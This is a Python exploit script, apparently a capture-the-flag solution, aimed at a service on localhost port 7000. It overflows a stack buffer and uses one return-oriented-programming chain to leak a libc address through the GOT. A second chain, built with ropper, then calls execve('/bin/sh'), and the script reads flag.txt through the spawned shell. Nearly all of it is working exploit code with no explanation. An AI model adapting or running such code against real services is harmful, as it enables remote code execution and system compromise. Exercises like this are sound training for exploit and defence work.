from struct import pack
import socket
import sys

p = lambda x : pack('Q', x)
SETSOCKOPTOFFSET = int("00000000001238a0", 16)

def get_set_sock_opt_address():
	pop_rsi_r15 = p(0x400cb9)
	write 		= p(0x4007c6)
	got 		= p(0x601210)

	o = b'A'*56
	o += pop_rsi_r15
	o += got 
	o += b'B'*8
	o += write

	s = socket.create_connection(("localhost",7000))
	s.send(o)
	ssoa = s.recv(1024)
	s.close()
	return int.from_bytes(ssoa[88:96], 'little')

# obtained with:
# ropper -f /lib/x86_64-linux-gnu/libc.so.6 --chain "execve cmd=/bin/sh"

def rop_chain(libc):

	rebase_0 = lambda x : p(x + libc)

	rop = b'A'*56
	rop += rebase_0(0x000000000002911d) # 0x000000000002911d: pop r13; ret; 
	rop += b'//bin/sh'
	rop += rebase_0(0x00000000000331ff) # 0x00000000000331ff: pop rbx; ret; 
	rop += rebase_0(0x00000000001eb1a0)
	rop += rebase_0(0x0000000000064075) # 0x0000000000064075: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += rebase_0(0x000000000002911d) # 0x000000000002911d: pop r13; ret; 
	rop += p(0x0000000000000000)
	rop += rebase_0(0x00000000000331ff) # 0x00000000000331ff: pop rbx; ret; 
	rop += rebase_0(0x00000000001eb1a8)
	rop += rebase_0(0x0000000000064075) # 0x0000000000064075: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += rebase_0(0x0000000000026b72) # 0x0000000000026b72: pop rdi; ret; 
	rop += rebase_0(0x00000000001eb1a0)
	rop += rebase_0(0x0000000000027529) # 0x0000000000027529: pop rsi; ret; 
	rop += rebase_0(0x00000000001eb1a8)
	rop += rebase_0(0x000000000011c371) # 0x000000000011c371: pop rdx; pop r12; ret; 
	rop += rebase_0(0x00000000001eb1a8)
	rop += p(0xdeadbeefdeadbeef)
	rop += rebase_0(0x000000000004a550) # 0x000000000004a550: pop rax; ret; 
	rop += p(0x000000000000003b)
	rop += rebase_0(0x0000000000066229) # 0x0000000000066229: syscall; ret; 

	return rop

def main():
	libc = get_set_sock_opt_address() - SETSOCKOPTOFFSET
	s = socket.create_connection(("localhost",7000))
	s.send(rop_chain(libc))
	s.recv(1024)
	s.send(b"cat flag.txt\n")
	print(s.recv(1024))
	s.close()
if __name__ == '__main__':
	main()